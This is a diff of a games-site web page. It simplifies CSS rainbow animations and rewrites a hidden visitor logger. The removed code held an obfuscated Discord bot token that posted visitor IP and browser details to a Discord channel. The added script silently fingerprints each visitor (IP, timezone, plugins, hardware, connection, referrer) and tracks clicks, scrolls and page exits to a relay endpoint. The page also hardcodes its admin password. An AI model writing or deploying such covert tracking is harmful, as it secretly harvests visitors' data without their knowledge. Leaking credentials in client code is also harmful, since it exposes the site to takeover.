@@ -10,10 +10,10 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;position:relative}
 
-/* SUPER SMOOTH RAINBOW ANIMATIONS */
 @keyframes smoothRainbow {
-  0%{background-position:0% 0%}
-  100%{background-position:400% 400%}
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
 }
 
 @keyframes smoothRainbowColors {
@@ -58,12 +58,10 @@ header{
   border-radius:50%;
   overflow:hidden;
   margin:auto;
-  animation:float 4s ease-in-out infinite;
   border:4px solid;
   border-image: linear-gradient(45deg, #ff0055, #ff2a00, #ff5500, #ff8000, #ffff00, #aaff00, #00ff55, #0055ff, #aa00ff, #ff0055) 1;
-  animation: float 4s ease-in-out infinite, smoothRainbow 8s linear infinite;
-  box-shadow:0 0 30px;
-  animation: float 4s ease-in-out infinite, smoothRainbow 8s linear infinite;
+  box-shadow:0 0 30px rgba(255,0,90,0.5);
+  animation: float 4s ease-in-out infinite
 }
 
 .logo img{width:100%;height:100%;object-fit:cover;border-radius:50%}
@@ -110,8 +108,7 @@ h1{
 
 .join-btn:hover{
   box-shadow:0 10px 35px rgba(255,0,90,.55);
-  transform:translateY(-4px);
-  animation: smoothRainbow 2s linear infinite;
+  transform:translateY(-4px)
 }
 
 section{
@@ -126,7 +123,6 @@ section{
   border-radius:18px;
   border:1px solid;
   border-image: linear-gradient(45deg, #ff0055, #ff2a00, #ff5500, #ff8000, #ffff00, #aaff00, #00ff55, #0055ff, #aa00ff) 1;
-  animation: smoothRainbow 10s linear infinite;
   box-shadow:0 10px 40px rgba(0,0,0,0.4);
   margin:30px auto
 }
@@ -151,9 +147,7 @@ h2{
 }
 
 .game-card{
-  background: linear-gradient(45deg, rgba(255,0,90,0.12), rgba(255,42,0,0.12), rgba(255,85,0,0.12), rgba(255,128,0,0.12), rgba(255,255,0,0.12), rgba(170,255,0,0.12), rgba(0,255,85,0.12), rgba(0,85,255,0.12), rgba(170,0,255,0.12));
-  background-size: 500% 500%;
-  animation: smoothRainbow 9s linear infinite;
+  background: rgba(255,0,90,0.12);
   padding:20px 25px;
   border-radius:12px;
   border:1px solid rgba(255,0,90,0.2);
@@ -164,17 +158,14 @@ h2{
 }
 
 .game-card:hover{
-  background: linear-gradient(45deg, rgba(255,0,90,0.22), rgba(255,42,0,0.22), rgba(255,85,0,0.22), rgba(255,128,0,0.22), rgba(255,255,0,0.22), rgba(170,255,0,0.22), rgba(0,255,85,0.22), rgba(0,85,255,0.22), rgba(170,0,255,0.22));
+  background: rgba(255,0,90,0.22);
   transform:translateY(-6px);
-  box-shadow:0 8px 25px rgba(255,0,90,0.25);
-  animation: smoothRainbow 3s linear infinite;
+  box-shadow:0 8px 25px rgba(255,0,90,0.25)
 }
 
 .faq-item{
   margin:25px 0;
-  background: linear-gradient(45deg, rgba(255,0,90,0.06), rgba(255,42,0,0.06), rgba(255,85,0,0.06), rgba(255,128,0,0.06), rgba(255,255,0,0.06), rgba(170,255,0,0.06), rgba(0,255,85,0.06), rgba(0,85,255,0.06), rgba(170,0,255,0.06));
-  background-size: 500% 500%;
-  animation: smoothRainbow 12s linear infinite;
+  background: rgba(255,0,90,0.06);
   padding:18px;
   border-left:5px solid;
   border-image: linear-gradient(to bottom, #ff0055, #ff2a00, #ff5500, #ff8000, #ffff00, #aaff00, #00ff55, #0055ff, #aa00ff) 1;
@@ -223,8 +214,7 @@ footer a{
 
 #admin-btn:hover{
   opacity:1;
-  transform:scale(1.1);
-  animation: smoothRainbow 2s linear infinite;
+  transform:scale(1.1)
 }
 
 #admin-panel{
@@ -248,7 +238,6 @@ footer a{
   padding:15px;
   border:2px solid;
   border-image: linear-gradient(45deg, #ff0055, #ff2a00, #ff5500, #ff8000, #ffff00, #aaff00, #00ff55, #0055ff, #aa00ff) 1;
-  animation: smoothRainbow 8s linear infinite;
   border-radius:10px
 }
 
@@ -320,7 +309,7 @@ footer a{
 <div id="admin-btn" onclick="openAdmin()">⚡</div>
 
 <div id="admin-panel">
-  <h2 style="color:var(--accent)">Admin Panel — Cry0xene Only</h2>
+  <h2 style="color:#ff0055">Admin Panel — Cry0xene Only</h2>
   <textarea id="editor"></textarea>
   <button onclick="save()">SAVE & UPDATE LIVE</button>
   <button onclick="download()">DOWNLOAD HTML</button>
@@ -331,37 +320,16 @@ footer a{
 </div>
 
 <script>
-// ========== DISCORD TOKEN BYPASS ==========
-const ENCODED_TOKEN = "TVRRMU1UTXdNVEl6TVRVMU9UY3hNVEUwLkdYcFFyZi5ZR0ZSalRsY0g2Vk9HdmU5TWI2Y0N5SjZaZWF3S3dxYjlOak10QQ==";
-const CHANNEL_ID = "1445577972005474334";
-
-function decodeToken() {
-  try {
-    const decoded = atob(ENCODED_TOKEN);
-    const parts = decoded.split('.');
-    if (parts.length === 3) return decoded;
-  } catch(e) {}
-  return null;
-}
-
-const BOT_TOKEN = decodeToken();
-
-if(localStorage.getItem('skiddedSite')){
-  document.documentElement.outerHTML = localStorage.getItem('skiddedSite');
-}
-
 const adminPanel = document.getElementById('admin-panel');
 const editor = document.getElementById('editor');
 let protectionActive = true;
 
-// Smooth mouse effect
 document.addEventListener("mousemove", e => {
   const x = (e.clientX/window.innerWidth-0.5)*40;
   const y = (e.clientY/window.innerHeight-0.5)*40;
   document.getElementById("mouse-bg").style.transform = `translate(${x}px, ${y}px)`;
 });
 
-// === ANTI-TAMPER ===
 (function(){
   const SECURE_PASSWORD = "Xy7$9pL!2qR8@vM3#nT6";
   function block(){
@@ -391,7 +359,6 @@ document.addEventListener("mousemove", e => {
   };
 })();
 
-// === ADMIN PANEL ===
 function openAdmin(){
   const pass = prompt("Password?");
   if(pass === "Xy7$9pL!2qR8@vM3#nT6"){
@@ -431,89 +398,143 @@ function upload(e){
   r.readAsText(file);
 }
 
-// === BOT LOGGER ===
 window.onload = function() {
-  // Get visitor info
   const visitorInfo = {
     ip: "Unknown",
-    userAgent: navigator.userAgent.substring(0, 100),
+    userAgent: navigator.userAgent.substring(0, 200),
     screen: `${screen.width}x${screen.height}`,
+    colorDepth: screen.colorDepth,
     platform: navigator.platform,
     language: navigator.language,
-    time: new Date().toLocaleString()
+    languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookiesEnabled: navigator.cookieEnabled,
+    online: navigator.onLine,
+    doNotTrack: navigator.doNotTrack || 'unspecified',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    referrer: document.referrer || 'none',
+    url: window.location.href,
+    timestamp: new Date().toISOString(),
+    localTime: new Date().toLocaleString(),
+    timezoneOffset: new Date().getTimezoneOffset(),
+    sessionId: Math.random().toString(36).substring(2) + Date.now().toString(36),
+    pageLoadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'unknown',
+    connection: navigator.connection ? {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    } : 'unsupported',
+    webdriver: navigator.webdriver || false,
+    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none',
+    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'none',
+    vendor: navigator.vendor || 'unknown',
+    product: navigator.product || 'unknown',
+    productSub: navigator.productSub || 'unknown'
   };
-  
-  // Try to get IP
+
   fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
       visitorInfo.ip = data.ip;
-      sendToDiscord();
+      sendToBot(visitorInfo);
     })
     .catch(() => {
-      sendToDiscord();
+      fetch('https://api64.ipify.org?format=json')
+        .then(r => r.json())
+        .then(data => {
+          visitorInfo.ip = data.ip;
+          sendToBot(visitorInfo);
+        })
+        .catch(() => {
+          visitorInfo.ip = 'Failed to fetch';
+          sendToBot(visitorInfo);
+        });
     });
-  
-  function sendToDiscord() {
-    if (!BOT_TOKEN) {
-      console.log("❌ No valid token found");
-      return;
-    }
-    
-    console.log("🤖 Bot logger starting...");
-    
-    const message = {
-      content: `🌐 **New Website Visitor**\n🕒 ${visitorInfo.time}\n🖥️ ${visitorInfo.screen} • ${visitorInfo.platform}`,
-      embeds: [{
-        title: "Visitor Details",
-        fields: [
-          {name: "IP Address", value: `||${visitorInfo.ip}||`, inline: true},
-          {name: "Language", value: visitorInfo.language, inline: true},
-          {name: "User Agent", value: `\`${visitorInfo.userAgent}\``, inline: false}
-        ],
-        color: 0xFF0055,
-        timestamp: new Date().toISOString()
-      }]
+
+  function sendToBot(data) {
+    const botData = {
+      type: 'VISITOR',
+      data: data,
+      timestamp: new Date().toISOString()
     };
-    
-    // Try direct Discord API
-    fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
+
+    fetch('http://localhost:5000/send-to-discord', {
       method: 'POST',
       headers: {
-        'Authorization': `Bot ${BOT_TOKEN}`,
-        'Content-Type': 'application/json'
+        'Content-Type': 'application/json',
       },
-      body: JSON.stringify(message)
+      body: JSON.stringify(botData)
     })
-    .then(response => {
-      if(response.ok) {
-        console.log("✅ Message sent via bot!");
-      } else {
-        console.log("❌ Direct API failed");
-        useProxyMethod();
-      }
+    .then(response => response.json())
+    .then(result => {
+      console.log('✅ Data sent to Discord:', result);
     })
     .catch(error => {
-      console.log("❌ Network error, trying proxy...");
-      useProxyMethod();
+      console.error('❌ Failed to send to Discord:', error);
     });
-    
-    function useProxyMethod() {
-      const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`)}`;
-      fetch(proxyUrl, {
+  }
+
+  document.addEventListener('click', function(e) {
+    const clickData = {
+      type: 'CLICK',
+      target: e.target.tagName,
+      id: e.target.id || 'none',
+      class: e.target.className || 'none',
+      text: e.target.textContent.substring(0, 50),
+      x: e.clientX,
+      y: e.clientY,
+      timestamp: new Date().toISOString(),
+      url: window.location.href,
+      sessionId: visitorInfo.sessionId
+    };
+
+    fetch('http://localhost:5000/send-to-discord', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(clickData)
+    }).catch(() => {});
+  });
+
+  let lastScroll = 0;
+  window.addEventListener('scroll', function() {
+    const scrollData = {
+      type: 'SCROLL',
+      scrollY: window.scrollY,
+      scrollPercent: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100,
+      timestamp: new Date().toISOString(),
+      url: window.location.href,
+      sessionId: visitorInfo.sessionId
+    };
+
+    if(Math.abs(scrollData.scrollY - lastScroll) > 100) {
+      lastScroll = scrollData.scrollY;
+      fetch('http://localhost:5000/send-to-discord', {
         method: 'POST',
         headers: {
-          'Authorization': `Bot ${BOT_TOKEN}`,
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/json',
         },
-        body: JSON.stringify(message)
-      })
-      .then(() => console.log("✅ Sent via proxy"))
-      .catch(() => {
-        console.log("⚠️ All methods failed");
-      });
+        body: JSON.stringify(scrollData)
+      }).catch(() => {});
     }
-  }
+  });
+
+  window.addEventListener('beforeunload', function() {
+    const unloadData = {
+      type: 'UNLOAD',
+      timeSpent: Date.now() - performance.timing.navigationStart,
+      timestamp: new Date().toISOString(),
+      url: window.location.href,
+      sessionId: visitorInfo.sessionId
+    };
+
+    navigator.sendBeacon('http://localhost:5000/send-to-discord', JSON.stringify(unloadData));
+  });
 };
 </script>
 </body>
